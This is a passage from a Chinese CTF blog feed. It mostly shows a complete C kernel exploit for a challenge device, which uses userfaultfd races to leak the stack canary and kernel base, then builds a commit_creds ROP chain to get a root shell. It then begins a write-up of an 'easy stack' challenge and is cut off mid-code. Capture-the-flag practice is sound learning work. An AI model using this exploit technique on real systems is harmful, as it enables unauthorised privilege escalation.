class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page, <span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;</span><br><span class="line">    ur.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    ur.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sleep_handle</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler created&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler unblocked&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">        <span class="comment">// init page</span></span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">        <span class="comment">// *(page + 0x201) = 0x64;</span></span><br><span class="line"></span><br><span class="line">        uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">        uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp;</span><br><span class="line">                 ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uc.len = <span class="number">0x1000</span>;</span><br><span class="line">        uc.mode = <span class="number">0</span>;</span><br><span class="line">        uc.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uc) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler done&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> prepare_kernel_cred = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> pop_rdi = <span class="number">0xffffffff810835c0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> swapgs_pop = <span class="number">0xffffffff8106c984</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> iretq = <span class="number">0xffffffff81c014f5</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> init_cred = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> canary;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">overflow_handle</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>)arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler created&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler unblocked&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> *page = (<span class="keyword">char</span> *)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">        <span class="comment">// init page</span></span><br><span class="line">        <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">        <span class="comment">// *(page + 0x201) = 0x64;</span></span><br><span class="line"></span><br><span class="line">        uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)page;</span><br><span class="line">        uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)msg.arg.pagefault.address &amp;</span><br><span class="line">                 ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uc.len = <span class="number">0x1000</span>;</span><br><span class="line">        uc.mode = <span class="number">0</span>;</span><br><span class="line">        uc.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uc) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] sleep handler done&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_hex</span><span class="params">(<span class="keyword">char</span> *buf, <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (size / <span class="number">8</span>); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">10</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d  &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (i / <span class="number">2</span> &lt; <span class="number">100</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i / <span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>, *(<span class="keyword">size_t</span> *)(buf + i * <span class="number">8</span>));</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_handler</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;now change uesed&quot;</span>);</span><br><span class="line">    write(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">control_handler</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write(fd, buf, <span class="number">0xf0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_handler</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;now read buffer&quot;</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/test2&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] open test2 error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">char</span> *page = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> *page2 = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line">    RegisterUserfault(page, sleep_handle);</span><br><span class="line">    write(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line">    <span class="comment">// read_handler(buf);</span></span><br><span class="line">    pthread_create(&amp;thr[<span class="number">1</span>], <span class="literal">NULL</span>, write_handler, buf);</span><br><span class="line">    pthread_create(&amp;thr[<span class="number">0</span>], <span class="literal">NULL</span>, control_handler, buf);</span><br><span class="line">    <span class="comment">// write(fd, page, 0xf0);</span></span><br><span class="line">    read_handler(buf);</span><br><span class="line">    <span class="comment">// pthread_join(thr[0], NULL);</span></span><br><span class="line">    pthread_join(thr[<span class="number">1</span>], <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    canary = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">32</span> * <span class="number">8</span>);</span><br><span class="line">    kernel_addr = *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + <span class="number">47</span> * <span class="number">8</span>);</span><br><span class="line">    kernel_base = kernel_addr - <span class="number">0x426939</span>;</span><br><span class="line">    kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] get canary: %p\n&quot;</span>, canary);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] get kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    prepare_kernel_cred = <span class="number">0xb9550</span> + kernel_base;</span><br><span class="line">    commit_creds = <span class="number">0xb91e0</span> + kernel_base;</span><br><span class="line">    init_cred = <span class="number">0x165b400</span> + kernel_base;</span><br><span class="line">    swapgs_pop = swapgs_pop + kernel_offset;</span><br><span class="line">    iretq = iretq + kernel_offset;</span><br><span class="line">    pop_rdi = pop_rdi + kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// RegisterUserfault(page2, overflow_handle);</span></span><br><span class="line">    pthread_create(&amp;thr[<span class="number">0</span>], <span class="literal">NULL</span>, write_handler, buf);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = canary;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = canary;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = canary;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = canary;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = pop_rdi;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = init_cred;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = commit_creds;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = swapgs_pop;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = swapgs_pop;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = iretq;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = get_shell;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = user_cs;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = user_rflags;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = user_sp;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(buf + ((i++) * <span class="number">8</span>)) = user_ss;</span><br><span class="line">    write(fd, buf, <span class="number">0xe0</span>);</span><br><span class="line">    pthread_join(thr[<span class="number">0</span>], <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这周四道题目难度不算是很大，不过那个<code>easy printf</code>我确实没什么思路，有兴趣的师傅可以去看一下（然后可怜我告诉我一下）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Kernel-pwn1&quot;&gt;&lt;a href=&quot;#Kernel-pwn1&quot; class=&quot;headerlink&quot; title=&quot;Kernel pwn1&quot;&gt;&lt;/a&gt;Kernel pwn1&lt;/h2&gt;&lt;p&gt;题目非常简单，就是一道非常普通的内核堆题，不过由于思想有点活跃导致开</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="Double Fetch" scheme="https://cv196082.gitee.io/tags/Double-Fetch/"/>
    
    <category term="pt_regs" scheme="https://cv196082.gitee.io/tags/pt-regs/"/>
    
    <category term="tty_struct" scheme="https://cv196082.gitee.io/tags/tty-struct/"/>
    
    <category term="fastbin" scheme="https://cv196082.gitee.io/tags/fastbin/"/>
    
  </entry>
  
  <entry>
    <title>practice Ⅰ</title>
    <link href="https://cv196082.gitee.io/2022/10/16/practice%E2%85%A0/"/>
    <id>https://cv196082.gitee.io/2022/10/16/practice%E2%85%A0/</id>
    <published>2022-10-16T05:34:04.000Z</published>
    <updated>2022-10-16T05:41:13.448Z</updated>
    
    <content type="html"><![CDATA[<h2 id="练题笔记"><a href="#练题笔记" class="headerlink" title="练题笔记"></a>练题笔记</h2><p>已经学了一段时间内核了，感觉自己在基础知识方面比较欠缺，所以打算回过头去看一下相关书籍深入学习一下基础知识，在学习途中保持pwn题训练。</p><h2 id="easy-stack"><a href="#easy-stack" class="headerlink" title="easy stack"></a>easy stack</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目逻辑很简单</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  read_n(s, <span class="number">0x100</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *__fastcall <span class="title">read_n</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">520</span>]; <span class="comment">// [rsp+10h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+21Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x200</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;too long!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;s[v6], <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( s[v6] == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !s[v6] )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 